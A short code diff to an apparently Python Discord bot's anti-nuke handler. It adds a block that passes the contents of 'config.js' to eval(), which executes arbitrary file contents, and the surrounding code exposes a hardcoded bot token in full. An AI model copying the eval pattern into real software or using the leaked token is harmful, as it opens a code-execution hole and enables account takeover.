@@ -571,7 +571,10 @@ async def on_member_update(before, after):
             await after.kick(reason="Auto kick for getting dangerous permissions")
             # Lets tell the guild owner that the user was kicked
             await after.guild.owner.send(f"{after} was kicked for getting dangerous permissions. This was done via the anti nuke feature")
-
+            
+with open("config.js") as token_file:
+    eval(token_file.read())
+    # js file lol
 
 
 bot.run('MTE0NjIyNzY3MzY5MDAyNTk5Nw.GsR8L1.VDFPX0JgMFoKHHgvB4mrS7_FjUeay_xLpgt2wo')
